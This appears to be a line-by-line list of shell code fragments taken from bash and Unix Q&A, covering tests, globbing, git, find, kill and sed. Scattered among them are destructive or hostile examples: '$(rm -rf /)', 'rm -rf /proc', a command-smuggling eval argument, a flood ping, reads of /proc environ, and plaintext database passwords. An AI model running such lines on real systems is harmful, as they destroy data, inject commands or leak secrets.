TIME_T_MAX = 9223372036854775807
sleep infinite
24 * 24 * 60 * 60 = 2073600 seconds
sleep infinity
sleep 1h 5.2s
sleep 0.5
strtod("infinity", 0)
while :; do :; done &
kill -STOP $!
sleep infinity
xstrtod (argv[i], &p, &s, cl_strtod)
man 3 strtod
xnanosleep (s)
struct timespec
diff file1 file2 >/dev/null
test -e filename
[ -e filename ]
test -e glob*
echo glob*
ls glob*
ls | grep -q "glob.*"
[ "${scripts[*]}" ]
[ "${#scripts[*]}" != 0 ]
-f "$1"
compgen -G
shopt -s extglob
compgen -G "<glob-pattern>"
git ls-remote --tags https://github.com/user/testpro.git | tail -n 1 | sed 's/.*refs\/tags\///g'
echo $line
-d -m name
pkill -9 -f name
wget $1 >> $LOG
|sudo tee
if "$var"; then
man woman
string1 = string2
[ ]
[[ ]]
[ ]
[[ ]]
[ ]
[[ ]]
1 == 1 ]]
[ "$var" = true ]
if true
# false
[[ -n $one ]]
[[ $var ]]
$var == 'true'
$var == 'false'
a=true; if $a; then ...
[[ ]]
set -u
[[ ${var-} ]]
#! /usr/bin/env python
chmod +x script.py
./scipt.py -f
sql=$(echo "SELECT * FROM RDB$DATABASE;")
echo DONE!
diff -q
ls -t
sed -e '1,10d'
tail -n +10
tail -n +11
xargs -d '\n' rm
-mtime +10
-type f
FILE_COUNT=$(ls -l | grep -c ^d )
wc -l
FILE_TO_DEL=$(ls -t | tail -n1)
tail -n1
find /media/usb0/backup/ -type f -name homematic-raspi*.sbk
-type f
-name homematic-raspi*.sbk
ls -A1t $(...)
tail -n +11
-n +11
xargs rm
-exec sh -c 'ffmpeg ... && rm'
-c command_string
man sh
$(rm -rf /)
find -name foo -or -name bar
find ./ -name "blabla" -exec wc -l {} ;
-exec bash -c
yourcommand |& mail ...
ls /dev/disk/by-uuid
mkfs -t vfat /dev/<your usb drive here>
tar -pc
tar -px
tar -pc … |tar -px
cp -pdr
rsync -a
git log
git branch
git for-each-ref
git show-ref
dd if=/dev/zero
rm -rf
rm -rf
rm -r
wget --page-requisites --mirror --convert-links
:help user-functions
:help recording
:help user-commands
ls -al
[ == "y" ]
which ruby
echo foo 1>&2
-t 0.1
echo "my errz" > /proc/self/fd/2
svn update
egrep "^(A|U)[ ]+(.*)"
cut -b 2
xargs -i cp -R "{}" /path/to/public_html
xargs -P <n>
-P 0
kill 0
sleep 2
sleep 4
; wait
; sleep 1
set -f
char M
dos2unix file_name
:%s/ctrl+v ctrl+m//g
sed -e "s/^M//" filename(exist file name) > newfilename(new name)
"$1" "$2" ....
$ ls -il
$ find . -inum 9340480 -exec ./unistrip.py {} \;
0 -eq 2
if [ "$(grep -w -- "$1" "$FILE")" ]; then
ls -C
echo " ${values[@]/%/$'\n'}" | column
mkvgconf $SOURCE $TARGET
kill %1
|| break
man bash
echo $var1
123 465 326 8080
echo $var2
sila kiran hinal juku
ps auxfww
ps ufww
ps auxfww
find . -mtime 0
ls -lt
> /dev/null
tidy -asxml
xmlstarlet sel
python --help
-p $PID
kill -0
ps aux
kill -9 $PID || true
kill -0 $PID
kill -0 $pid
-o pid=
ps --pid "$pid"
> /dev/null
ps --pid "$pid"
> /dev/null
shellcheck path/to/this_script.sh
if mycmd;
# shellcheck disable=SC2181
ps aux
svn move
nth + 1
nth + 3
; done
make clean
[ "$item" -ne 0 ]
cut -f 1
du -b $1
du -b $1 | cut -f 1
set -x
set -v
find -name out.ogv -exec ./runit.sh myfile '{}' \;
man bash
export PS1='$(uuidgen) $RANDOM'
pip install facebook-sdk; python get-token.py
rwt -- get-token.py
"two five"
"two" "five"
man test
set -u
grep -C 1 'port number' file.txt
sed -n '/^port$/{n;p}' < file.txt
/port number/
 while read line; do python python_script.py -l $line; done < pdfURLs.txt
rvm gem list
rails (2.3.8)
rvm gem install rails
rvm gemset use my_rails238_gemset
vim myshiz
[ -z "$PS1" ] && return
set shell=
chmod +x
export varname=value
source set_proxy_env.sh
. ~/bin/set_proxy_env.sh
export MYVAR=value
$ which svnnotify
not found
whereis bash
echo -n "$Q"
echo -- "$Q"
cat <<< "$Q"
printf -- '%s' "$Q"
log -vr rev1:rev2
hg log
hg log
sort -u
hg status -ma --rev rev1-1:rev2
chmod +x hello-world
chmod +x hello-world
$ chmod +x test.sh
$ ./test.sh
wait: wait [n]
ls -lR | grep .*.mp3 | wc -l
sed -i
basename $i .html
import tempfile
version: 1
command --help
for i in $list
perl clusterImage.pl
[ -f file.png ] && echo "file exists"
perl clusterImage.pl <name_of_image.png>
perl separateObjects.pl <name_of_image.png>.kmeansOutput.all.matrix
image_array=($(ls *.png))
<cmd> | paste -sd+ - | bc
MESSAGE=$(eval echo...
sort -n -k4
awk -v awkvar=$bashvar 'awkscript'
nohup bash -c 'for i in mydir/*.fasta; do ./myscript.sh "$i"; done' > output.txt &
ls "is a file"
is a file
echo -e
bash -c
screen -X
bash -c
ls foo
for arg in "$@"
wc -L
wc --max-line-length
awk '{ if (length($0) > max){max = length($0)} } END { print max }' in.txt
awk 'length <= 50 { printf "%-50s\n",$0 }' in.txt
MAX=$(awk '{ if (length($0) > max){max = length($0)} } END { print max }' in.txt)
awk -v max=$MAX 'length <= max { printf "%-"max"sX\n",$0 }' in.txt
awk -v max=$(awk '{ if (length($0) > max){max = length($0)} } END { print max }' in.txt) 'length <= max { printf "%-"max"s\n",$0 }' in.txt
gzip -t
tail -c
tail -c
/var/run/screen/S-root/25771.pts-0: No such file or directory
grep -w '*.exe' filteredAccessLog > filteredSuccessIMGAccessLog
grep -F .exe filteredAccessLog > filteredSuccessIMGAccessLog
tail -c 80
uuencode dummy.wav < dummy.wav
echo ($WR+$RD)*$SERVICE_DEMAND | bc
npm install http-server -g
http-server -o
echo ^G
tput bel
man printf
printf "\a"
printf "\a"
osascript -e 'tell application "System Events"
osascript -e 'beep'
set -x
java -version
xsel -b -o
tr -d '\n'
tr -s ' '
xsel -b -i
Replace with
Regular expression
sed '/^[[:space:]]*$/d'
cat filename | sed '/^[[:space:]]*$/d'
echo blah > file.txt
vim inputfile
:%s/ //g
main:        unable to connect to host: Connection refused (111)
ssh server
gzip wordpress_database.sql
ssh server "mysqldump -u root -p'mypassword' --single-transaction wordpress_database | gzip -c" | gunzip -c | /Applications/MAMP/Library/bin/mysql -u root -p'mylocalpassword' wordpress_database
chmod 600
wc -l < <filename>
wc -l file
awk 'END{print NR}' file
sed -n '$=' file
wc -l foo
ls -l | wc -l
man nl
wc -l
wc -l
wc -l myfile.txt
wc -l < myfile.txt
grep -oE '\d+'
wc -l
wc -l <filename>
wc -l  24-11-2019-04-33-01-url_creator.log
63 24-11-2019-04-33-01-url_creator.log
wc -l <filename>|cut -d\  -f 1
wc -l  24-11-2019-04-33-01-url_creator.log|cut -d\  -f 1
echo -n
END { }
emn /long/stack/error.rb:123
remote_owner=$$($(MAKE) remote.owner)
remote_owner=$$($(MAKE) --silent remote.owner)
echo "FooBar" | tee >(cat >&2)
>(cat >&2)
cd ~/Desktop; ./highest
svn ls
svn blame
tr -s " " " "
cut -d" " -f3
uniq -c
sort -nr
head -1
tr -s " " " " | cut -d" " -f3
<filename> <most prevalent author>
sleep 5
make DESTDIR=$path $target
cd -
ditto [-v] [-V] 2>>some.log
copying file ...
tar -v
tail -1
-x  treat each row of stdin as x
man bash
find . -size +2047MB
find . -size +2047M
find . -size +2G -maxdepth 1
ls -dils
find . -size +2G -maxdepth 1 -ls
find: invalid -size type `B'
du yourfilename.ext -h
sh myscript.sh
syntax error near unexpected token '>'
tee -i
ls -C --color=always
exec > >(tee log.txt)
exec >$PIPE
rm $PIPE
1ddddd9-filename maybe with spaces - and other stuff.1983.mp3
wrap1 echo hello
alias myalias echo
wrap1 myalias hello
wrap2 echo "\\a"
shopt -s expand_aliases
Cannot find file
python /path/to/my/python/script.py
python /home/ThinkCode/libs/python/script.py
chmod +x /home/ThinkCode/libs/python/script.py
#!/usr/bin/env python
Ludwig van Beethoven - 5th Symphony and 6th Symphony &#39;&#39;Pastoral&#39;&#39; - Boston Symphony Orchestra - Charles Munch
Ludwig van Beethoven - 5th Symphony and 6th Symphony ''Pastoral'' - Boston Symphony Orchestra - Charles Munch
&#1040;&#1083;&#1080;&#1089;&#1040; (Alisa) - &#1052;&#1099; &#1074;&#1084;&#1077;&#1089;&#1090;&#1077;. &#1061;&#1061; &#1083;&#1077;&#1090; (My vmeste XX let)
АлисА (Alisa) - Мы вместе. ХХ лет (My vmeste XX let)
sort -t"\t"
tail -f logfile
set +x
ps $$
ps o command= $$
ps -o command -p $$
lsof -p $$ | awk '(NR==2) {print $1}'
$(type -p)
bash 3
help for
wc -l
ps -aux | grep process1
mnt=$(mktemp -d)
man find
-p <prefix>
-s <suffix>
-o modtime
ls -1cr
ls -v
gawk 'BEGIN{ a=1 }{ printf "mv %s %04d.jpg\n", $0, a++ }'
echo 1
find .
grep 'avi'
nl -nrz -w3 -v1
while read n f; do mv "$f" "$n.avi"; done
for x in $p
CRON="$( pstree -s $$ | grep -c cron )"
@{[ ... ]}
watch ls
watch ./my_script.sh
help nvim-terminal-emulator
declare -px
declare -pr
set -i
set -o emacs
let 0
some_command > /dev/null
set -x
echo Log message
sh filename.js
node filename.js
: //
':' '//'
function(){ ... }
. mylib.sh
lib_function1 arg1 arg2
mylib.sh lib_function1 arg1 arg2
mylib.sh --help
declare -f
mylib.sh function1
basetool=$(basename $0)
hg incoming -v
if hg incoming -v | grep models.py > 0
./manage.py resetdb
hg incoming -v | grep manage.py
hg push ssh://username@www.example.com//somepath/morepath
hg push
hg out
confirm && hg push ssh://...
yes | command name here
hg push ...
echo -en
$2 $3 ...
Git on Windows
read -n 1
 [y/N]?
echo $REPLY
echo ''
Vicky Ronnen
result=$(some_func "arg1")
declare -n
eval "${returnVariable}='${value}'"
myFunction "date && var2"
printf -v "${returnVariable}" "%s" "${value}"
date +%d
[ "$(date '+\%a')" == "Sun" ] && echo SUNDAY
[ ... ]
kmlmerge $file $file
zsh 5.0.2 (x86_64-apple-darwin13.0)
autoload <func_name>
echo $fpath
autoload -U +X bashcompinit && bashcompinit
autoload -U +X compinit && compinit
source /path/to/completion
antigen apply
rm ~/.zcompdump && rm $ANTIGEN_COMPDUMP
date -r
date -d @1278999698 +'%Y-%m-%d %H:%M:%S'
date -d @1278999698 -R
date -d @1278999698 +%c
date -d @
date -r 123456789
touch -t
printf '%(fmt)T' $UNIXEPOCH
printf '%()T'
date -f
tail -f squid/access.log
exec -a <newname>
exec -a
exec -a
program "2010/07/15 12:13:14"
"PID" = ...
Rahul Kapgate arg
./a.out -a "$temp"
git remote update
git status -uno
git show-branch *master
git remote update
git remote -v update
pull --rebase
git rev-parse <ref>
git merge-base master origin/master
git rev-parse --help
git merge-base @ @{u}
git rev-parse @
git rev-parse @{u}
git fetch
git remote update
git fetch (remote)
git log
git pull
git fetch
git all status
git pull
git fetch
git pull --dry-run
git rev-parse --abbrev-ref @{u}
origin master
git ls-remote
git rev-parse HEAD
[ a = b ] && x || y
[ test ]
&& true || false
directory name
git pull
./pull.sh "origin/main"
git status
Age: 46 min.
git fetch
git show HASH
git diff HASH
Updating 9e1ff307c779..60a9483534ed Fast-forward
git ls-remote origin --tags PATTERN
git remote show
doit echo 'single quote $VAR'
echo 'single quote $VAR'
set -x
man kill
sed 's/../&:/'
"1" test
cut -d '"' -f2
mkdir -p
!comment: http://www.test.com
man gcin-message
awk -vp=$mul -vq=$exp 'BEGIN{printf "%.2f" ,p * q}'
help expand-command-substitution
man bash
set cmd ls; $cmd
[[ ... ]]
@stat = lstat($ARGV[0]);
set +H)
my internal xxx ip: command not found
[[ expr ]]
[[ cat =~ ca[bat] ]]
man bash
! -d
BEGIN { $saved = ""; }
autoload zmv
alias zcp='zmv -L'
alias zln='zmv -L'
-type f
cat {} \;
whereis Rscript
mysqldump -ufoo -pbar --opt --routines db > ~/sqldump/{$todays_date}.sql
ln -s ~/sqldump/{$todays_date}.sql latest.sql
scp foo@domain.tld:~/sqldump/latest.sql ~/sqldump
mysql -ufoo -pbar db < latest.sql
date +%F
ssh user@host  "mysqldump ... > ... && ln -s ...
while true ; do ... done
ps -p $pid
ps -p $pid
<div id="example""><a href="">title</a></div>
help test
perl -MConfig -le 'print $Config{sh}'
env BUILD_NUMBER=$BUILD_NUMBER
man sshd_config
-o SendEnv
mail -s "$(echo -e "This is Subject\nContent-Type: text/html")"  test@yahoo.com  <  mytest.html
mutt -e "my_hdr Content-Type: text/html" test@yahoo.com  -s "subject" < mytest.html
shell script
git log -n 1 HEAD
cat $1
2>&1 1>/dev/null
>/dev/null 2>&1
system('source .bash_profile')
system('export var=somepath')
system('echo $var')
zypper lr
zypper rr [NUMBER]
echo $0
ps  -ef | grep $$ | grep -v grep
echo $SHELL
ps -p $$
ps -ef
echo $SHELL
cat /proc/$$/cmdline
readlink /proc/$$/exe
$(getshell) --version
ls –la /bin/sh
/bin/sh -> /bin/bash
/bin/sh ->/bin/dash
ln -s /bin/bash /bin/sh
-o args
-o comm
echo $SHELL|sed "s/\/bin\///g"
man join
"${BASE_COMMAND} --limit-rate=${RATE_LIMIT}"
man 5 inittab
sleep 5
man systemd.timer
{piped_command_here} | stdbuf -oL uniq | {more_piped_command_here}
sed 's/tag1/tag2/g'
sed 's/tag2/tag1/g'
trap -p INT
trap -p 2
trap -p
trap -p
trap -p SIGNAL
trap -- ??? SIGNAL
trap -p SIGNAL
trap -p EXIT
trap -- '_osht_cleanup' EXIT
1" "2
"1 2"
'rm -fr ...'
trap -p SIGNAL
cut -f2 -d \'
echo AAA
trap -p
trap -p
trap -p
trap -p
echo AAA
trap -p
find -exec ...
export VARIABLE_NAME=VALUE
echo $4
x/Xw L
gdb ./executable
gdb attach pid
PTRACE ATTACH
ls -t
ls -t
dirname $0
ps aux|grep my_prog
awk '...'
mkfifo capture
-s duration
jobs -l
jobs -l
jobs -l %
stty eof
compgen -W
perls=(perl-one perl-two)
ls "${perls[*]}"
ls "perl-one perl-two"
perl-one perl-two
ls "${perls[@]}"
ls "perl-one" "perl-two"
fcntl(mypipe, F_SETFL, O_NONBLOCK)
brew install coreutils
readlink -f
grep -f
) evaluates its contents and returns the output, similar (identical?) to
.  It's a quick way to write an
date +WeekNo.%W
man date
ping -f
ping -f -s 65507
(echo "running 'dummy'"; sleep 2; exit $result)
open -a ...
vi file.c
gcc file.c
./backup.sh: Starting backup process in '/backup'...
./backup.sh: Starting backup process in '/backup'... [OK]
echo -n hello
which java
find ~/code -name '*.txt'
exec >& logfile
for i in "$sourcedir/*"
for i in *
find "$sourcedir" -type f | while read -r i
tweet Testing out my command-line tweetings.  #commandlinetweets
set --
tweet "bla bla bla"
find -name '*.txt'
{command; command}
; printf "\n"
; echo
printf "%s\n"
nohup ./script.sh 1>/dev/null 2>&1 &
gnu screen
GNU bash, version 3.1.0(3)-release (i686-pc-msys)
$COMSPEC /c batchfile param1 param2
alias ls='ls --color=auto'
bash getconfig.sh
sh getconfig.sh
bash scriptname.sh
sh scriptname.sh
scriptname -p $PORT -u $USER -P $PATH -o $OPTIONS
bash ./choose.sh
echo $A
export A=1
echo $A
export -f
auto_commit_after_request = true
grep -v "0"
grep "0"
grep "\b0\b"
grep -v " 0 "
[ -t 2 ]
$amount_of_movies = 6
$amount_of_0_movies = 1
$(( ... ))
man test
git ls-remote --tags
git push -n
./script.sh custom.log
script.sh TERMINAL
>> ${OUT}
man su
su -c 'some command'
grep --color
if x=5; then echo "it is 5"; fi
if x==5; then echo "it is 5"; fi
if [x==5]; then echo "it is 5"; fi
if [[x==5]]; then echo "it is 5"; fi
if [[x=5]]; then echo "it is 5"; fi
if [x=5]; then echo "it is 5"; fi
if [x -eq 5]; then echo "it is 5"; fi
if [[x -eq 5]]; then echo "it is 5"; fi
if x==5; then ...; fi
if [${x} -eq 5]
man test
git archive -o ../latest.zip some-commit
git diff --name-only previous-commit latest-commit | zip ../changes.zip -@
git stash
git stash apply
git checkout latest-commit
git checkout master
git archive
git diff HEAD@{1} --name-only -z | xargs -0 git archive HEAD -o patch_$(date +'%Y%m%d').zip --
echo -n
man echo
-n     do not output the trailing newline
help echo
shopt -s expand_aliases
(set -o posix) 2>/dev/null && set -o posix
set -x
set +x
tail -f
man bash
./myscript &
&> file
cd /
umask 0
nohup ./script.sh < inputFile.txt > ./logFile 2>&1 &
nohup ./script.sh < /dev/null > ./logFile 2>&1 &
ps -aux | egrep "script.sh"
kill -9 <PID-OF-YOUR-SCRIPT>
echo /var/lib/gems/*/bin
printf "%s\n" /var/lib/gems/*/bin | paste -s -d':'
ls -l
ls -l
cp -as
sudo bash -c 'whoami; whoami'
$1 OFS $2 OFS ... $NF ORS
ls | grep
ls | grep -i <something>
eog $(ls | grep -i <something>)
eog FILENAME
for i in 'ls | grep -i ...'; do eog $i; done
ls | grep
eog $i &
find | xargs
[ -z "$b" ] && b=BYE
unset $a
x=`exit 1|cat`
declare -a
declare -a PIPESTATUS='([0]="0")'
exit 1
exit 1|cat|xargs -I {} x={}
declare -a
declare -a PIPESTATUS='([0]="1" [1]="0" [2]="0")'
exit 1
echo 1|cat|xargs -I {} x={}
xargs: x={}: No such file or directory
exit 1
echo 1
set -o pipefail
echo -e $PS1
man -Pless\ +/parameter\\\ transformation bash
bash --rcfile <(echo "PS1='$PS1'") -i <<<'' 2>&1
<everything, terminated by end-of-line><prompt>end-of-line<prompt>exit
<everything, terminated by end-of-line>
$ 
read -r
read -e -p
set +o emacs +o vi
Aug 08
sleep 1000 > myfile &
cat > myfile &
man tail
man bash
cat > myfile &
command &
cat > myfile &
cat </dev/null > myfile
exit 1
git diff
cp -f /demo/*.xml new_demo/
in $@
for arg
for arg in $@
uname -s
uname -s
#!/usr/bin/env bash
uname -s
uname -s
uname -o
uname -sr
--kernel-name --kernel-release
uname -s
[ -f /usr/bin/cygwin1.dll ] && echo Yep, Cygwin running
man bash
rename FROM TO FILE
sed -e
man execve
ls -l |grep
var=$(ls -l |grep .. )
cp -rf firstDir/* secondDir
Screen session on host2 (system load: 0.01 0.03 0.05)            2017-04-23 14:14
Screen session on host1 (system load: 0.00 0.00 0.00)            2017-04-23 14:14
Command: caption always|splitonly [string]
chmod -R 775 *.cgi
chmod 775 *.cgi
chmod -R 775 *.cgi
chmod -R o+r *.cgi
set -e
-o omitpid
man echo
rm "$libcpfs_a" && ar rcs "${libcpfs_a}" ${libcpfs_objs[*]}
set -e
date +%u
< 6
> 5
man bash
./test.sh "a  b    c d"
echo "a" "b" "c" "d"
echo "a  b    c d"
CFLAGS="-Os -std=c99 -Wall"
ls -lh
source .bashrc
ls -lh
git help submodule
git pull
git submodule update
git fetch --recurse-submodules -j2
find .
-type d
-depth 1
-exec {} \;
git --git-dir={}/.git --work-tree=$PWD/{} pull
-depth 1
-mindepth 1 -maxdepth 1
mr up
mr st
mr push
mr log
mr diff
mr help
mr run
mr run git tag STAGING_081220015
echo $myvar
echo $myvar#world
echo ${myvar#world}
hexdump -C
sed -i
sed --in-place
sed -i.bak
sed --in-place=.bak
mycommand $filename
wc -l
bash> ./script.sh <path to tab-delimited file>
source init_env
env -i
env -i
env -i
[ $((${nValid} & 0x1)) -eq 1 ]
1 << 0 == 1
1 << 1 == 2
1 << 2 == 4
nValid & 0x2
sed 's%^.*/%%'
sed 's/pattern/str/g'
sed 's%^.*/%%'
sed 's/pattern/str/'
ls -l /usr/local/bin/foo
which command
ls -l /usr/local/bin/command
ls -lL /usr/local/bin/command
file /usr/local/bin/command
echo $PATH
sort -r -k1 -n
kill 1234 1122 7654
grep '[p]ython csp_build.py'
sleep 3600 &
ps -ef | grep sleep
sleep 3600
grep sleep
ps -ef | grep '[s]leep'
grep '[s]leep'
grep '[s]leep'
| grep -v grep
pkill '^python*'
pgrep -l '^python*'
pgrep '^python*' | xargs kill
kill -Hup $(ps ux | grep Firefox | awk 'NR == 1 {next} {print $2}' | uniq | sort)
gkill processname
ps aux  |  grep -i csp_build  |  awk '{print $2}'  |  xargs sudo kill -9
awk '{print $2}'
kill -9 5124
kill -9 5373
p csp_build
p python
ka csp_build
ka python
ka csp_build 15
ka python 9
kill -SIGTERM $(pgrep -i midori)
kill $(ps -elf | grep <process_regex>| awk {'print $4'})
ps -elf | grep top
kill -$(ps -elf | grep top| awk {'print $4'})
kill -9 $(ps -elf | grep top| awk {'print $4'})
ps -ef | grep '<exe_name>'
ps -ef | grep '<exec_name>' | grep -v 'grep'
-v 'grep'
man 7 signal
man signal
man pgrep
pkill -f csp_build.py
pkill -9 -f csp_build.py
tr -s ' '
Operation not permitted
rm *
"${fspec: -3}" = ".py"
for file
tar -M --tape-length 1024
gedit afile
chmod +x mytask.sh
sh myscript.sh 30 myfile.sh
./myscript.sh 30 myfile.sh
scriptname -f filename -c 12
scriptname -c 12 -f filename
ls --color=auto
ls --color
less -R
command | less
| tee
> /dev/null
-c, --command
sudo apt install expect tcl
sudo apt-get install expect-dev
set -e
set +e
set -
set +
set +e
set -e
compgen -abck
git p
complete -p
complete -o bashdefault -o default -o nospace -F _git git
sudo su -
$USER == 'root'
who am i
sudo su [whatever]
who am i | awk '{print $1}'
who|awk '{print $1}'
who am i
"Log message: Fetching animals cat dog mouse"
"Log message: Fetching animals"
"cat dog mouse"
Special Parameters
npp .gitignore build.gradle
gitk test -- .gitignore
first url, second url, third url
/second (url)/
sed --help
man grep
man re_format
C:\Program Files\Git\bin
/c/Documents and Settings/username
[ $(date +%A) = Saturday ]
myprogram --file=/path/to/file
$1, and so on).
man getopt
-c command
/c --login
sudo chmod 755 the_file_Name
grep --exclude
grep -R
man strings
-q -DforceStdout
tail -1
mvn package
pip install yq
man read
grep -q
if [ ];
if [ -n "$(find …)" ]
if [ "dir/file dir/otherfile" = "" ];
if [ dir/file dir/otherfile = "" ];
find -name "PATTERN"
head -n 1
grep -F
grep -E
* * * * * bash /home/rupert/test.sh
dump=`qstat -f `qstat``
dump=$(qstat -f )qstat$()
dump="$(qstat -f)qstat"
qstat -f "$(qstat)"
dump="$(qstat -f "$(qstat)")"
qstat -f $(qstat)
fuser foo.part2.rar
sed -n "s/\x00ENV_VAR_NAME=\([^\x00]*\)\x00/\1/p" /proc/pid/environ
sed -n "s/\x00ENV_VAR_NAME=\([^\x00]*\)\x00/BLAHBLAH/p" /proc/pid/environ
cat /proc/pid/environ | tr '\000' '\001' | sed -n "s/\x01ENV_VAR_NAME=\([^\x01]*\)\x01/\1/p"
:set list
:set nolist
:set ff
od -t c <filename>
od -c <filename>
cat -v <filename>
cat -v
cat -e
cat -et
todos filename
fromdos filename
sudo apt-get install tofrodos
cat -v <filename>
less -u
man less
cat -e <filename>
vim -b filename
file -k
dos2unix -ih
file -k
dosunix -ih
file -k
file -k somefile.txt
with CRLF line endings
with CR line endings
line endings
dos2unix -ih
man file
man dos2unix
:e ++ff=unix
set statusline+=\ %{&fileencoding?&fileencoding:&encoding}
:set fileformat
arg 2
readlink -f $0
brew install coreutils
grealpath .
ln -s $(pwd)/realpath /usr/local/bin/realpath
brew install coreutils
ln -s
cd /path/to; pwd
readlink -f
readlink -f
readlink -f
canonicalize_filename_mode(path, CAN_ALL_BUT_LAST)
readlink -f
readlink -f
less -R
command1 && command2
echo 'hello' ; ls
WORD == toupper(WORD)
./basscript parm1 parm2 parm3
ln -s /var/data/2/ /somepath/data_link
ln -s /var/data/1/ /somepath/data_link
readlink foo
perl -e 'print readlink $ARGV[0]' mylink
ls -l mylink
$(cd mylink && command -p pwd)
[[ ]]
[[ ]]
&& unset
declare -p ARR
declare -p ARR
declare -p ARR
sort -nr
sed 1q
sort --version-sort
echo $(cd $PWD/../.. && echo $PWD)
rtrav() { test -e $2/$1 && echo $2 || { test $2 != / && rtrav $1 `dirname $2`;}; }
rtrav .git $PWD
test -e $2/$1
ps axf
command 2>&1 &
sh commands.txt
command 2>&1 &
eval "$line"
"$file = $prog"
"$file" = "$prog"
CONDITIONAL EXPRESSIONS
-n string
True if the length of string is non-zero.
if [ "basename ${file}" =...
dpkg -l
[ -n "$x" ]
[ -n "${x+set}" ]
[ -z  ]
[ -z "" ]
[ -z "${var+x}" ]
[ -z "$var" ]
set -u
set -o nounset
[ -z
set -u
test -z
test -n
[[ -z "$var" ]]
declare -p
&> /dev/null
declare -p
[[ ]]
declare -p var
declare -p var
[ -n "$var" ]
[ -n "${var+x}" ]
[ "${#var[@]}" != 0 ]
[ -n "${var+x}" ]
typeset -p
declare -p
typeset -p
declare -p
[ -n "{$var+x}" ]
test -v var
[ -v var ]
[[ -v var ]]
[ -n "${var+x}" ]
typeset -p
declare -p
[ -n "$var" ]
[ -n "${var+x}" ]
[ "${#var[@]}" != 0 ]
declare -p var
declare -p var &>/dev/null
[ -n "${var+x}" ]
local var
declare -p
set -u
[ -z "$var" ]
var; unbound variable
set -u
[ -z "${var-}" ]
exit 127
exit 127
exit 127
unset VARIABLE
exit 127
test -n "${var-}"
test -n "${var+x}"
test -n "a"
test -n ""
test -n "$var"
set -u
test -n "${var-}"
test -z "${var-}"
declare -p
test <expression>
[ <expression> ]
[ ${var+x} ]
[ ${!name+x} ]
[ ${N+x} ]
set -eu
man grep
gfind '*php' 'search string'
gfind 'search string'
vi + filename
vi +lineNumber filename
vi +100 filename
man 5 termcap
man 5 terminfo
man xterm
./foo.sh &
main "$@" &
your_script; my_postprocessing
your_script && my_postprocessing
echo "$DIFF"
[ "$(diff ...)" ] && echo "Difference found"
ls -1t | tail -1
find . -name "*.log" -exec grep -l "The SAS System" {} \; > sas_log_list.txt
find -exec .. +
-size 0
exit 0
! -size 0
-type f
find -exec
find . -name '.*' -delete
sed /s/ü/ue/g
ä  öö ü ß.app
0xC3 0x9F
git commit -X
open -a 'Flash Player'
alias e=execute
l -l
e 'mytask'
-type f
ls -l
ls -ld
ls -l
"$?" == "0"
rvm update
rvm install 1.9.2
grep -f FILE
tail -1
echo your_variable_here | grep "^-\?[0-9]*$"
test -n "$1" -a "$1" -ge 0 2>/dev/null
gcc main.c -o main
make clean
make: main is up to date.
make -B
make --always-make
gcc -M
sed 's/&amp;/&/g' | sed 's/&/&amp;/g'
tclsh.exp somefile.tcl arg arg ...
eof stdin
sudo -u user_B special_script
grep -r
rm -rf /proc
cp -a /proc /proccopy
--graph --decorate --all
tput cols
git alias
git log --pretty=format:"%C(magenta)%h %C(cyan)%C(bold)%ad %C(green)%<(20,trunc)%an%x09%Creset%C(yellow)%s%Creset" --date=short --color=always | head -20| cat -n
git diff --stat
git log --stat
git log --stat
 
strbuf_addf(&out, "%-*s", len, name);
strbuf_addf(&out, "%-*s", len, name);
git diff --stat
git diff --cached --stat
grep -f
grep -f
wc -l
bc -l
*= /= %= += -= <<= >>= &= ^= |= ++ --
split($0, a, /: */)
$0 = a[2]
$ xxx
command argument argument...
open myfile.txt w+
open "myfile.txt" "w+"
puts Hello
set a='something'
a = 'something'
wget "ftp://user:pass@host/prefix*
rm -f file
wine ./bgmain.exe
man bash
($ffxapp == "/Applications/Firefox.app")
($ffxapp == "")
echo $FOO
grep -o
cp -r t1 t2
-I {} -d\\n
tar xf
tar -czf workspace.tar.gz .
cd -P ..
cd ..
find . -maxdepth 1
ls -1A | xargs -d "\n" tar cfz my.tar.gz
ls -1A | grep -v my.tar.gz | xargs -d "\n" tar cfz my.tar.gz
xargs --show-limits
tar: .: file changed as we read it
ls -A
ls -a
git archive
-e xyz
echo "$VAR"
-e xyz
bash echo
001 002 003 004
ssh user@localhost
set --
ssh-keygen -t rsa
-N ""
-f my.key
-f /mypath/bla
-N ""
yes "y"
bash -s command
bash -c command
add_alias some_alias
source modify_bash_aliases.sh
add_alias some_alias
INSERT INTO ... SELECT * FROM external_table;
NSString *testFolder = [NSString stringWithString:@"/Users/test/Desktop/test\\ 1"]
cd.sh: line 9: cd: /Users/test/Desktop/test: No such file or directory
chmod a-x
sh myscript
bash myscript
. myscript
sh myscript
. myscript
exit $RETURNVALUE
chmod a-x myscript
sh myscript
exit $SOMERETURNVALUE
sh myscript
bash myscript
sh ./myscript.sh
bash scriptname
. -name *.zip|unzip -d ~/fonts
return [n]
sudo visudo
%admin ALL = NOPASSWD: /usr/bin/apt-get
chmode +x run.sh
$ sudo nano .profile
$ echo $PATH
-bash: nano: command not found
if [ -e /usr/bin/java ]
| tail -c 32
read -p
SELECT COUNT(*) FROM somedata WHERE type = 2
GNU bash, version 3.2.39(1)-release (i486-pc-linux-gnu)
while read
/usr/bin/time -f'%E' $CMD
grep -v grep
grep -i "$SERVICE"
ps -e -o comm
grep -v grep
grep -cFi
set -e
& disown
eval "${cmd}"
array=(word "two words" something)
array=(word "two widgets" something)
|| <run_your_if_notfound_command_here>
if ... then
LIST=("1" "2" "4")
unset IFS
printf -v
break 0
break n
return  true
rvm install 1.8.7
rvm 1.8.7 --default
rvm install 1.9.2
rvm install 1.9.2-head
rvm 1.9.2 --default
rm -rfv ~/.rvm
rm ~/.rvmrc
rvm install ree
rvm use ree
rvm use 1.9.2
rvm info
rvm implode
export PATH=$SCRIPTS:$WORKSPACE:$ANDROID_HOME:$HEROKU$PATH
export PATH=$SCRIPTS:$WORKSPACE:$ANDROID_HOME:$HEROKU:$PATH
perl -e ""
php -r ""
Invalid argument
timeout -9 0.1 bash -c 'while (true) do echo AA ; done'
time bash -c 'comm <(echo "1234567890" > /dev/ttyUSB0) <(cat -A /dev/ttyUSB0)'
cat -A /dev/ttyUSB0
cat -A
git add -u
git add .
git add -u
git-ls-files --exclude-standard
find-all 'href="([^"]*)"' < index.html
grep -o
include 'myfile.inc';
source ~/.bashrc;
date +%s
printf "0x%x" some_number
$(( expression ))
display-from baz[0-9]* < file
$stdout.sync = true
if [ ! -x $mysql_exec ] ...
if [ ! -x "mysql" ]; then print "oh oh"; fi
if [-L $file]
type -P
type -p
curl http://the.stream>/path/to/thebuffer
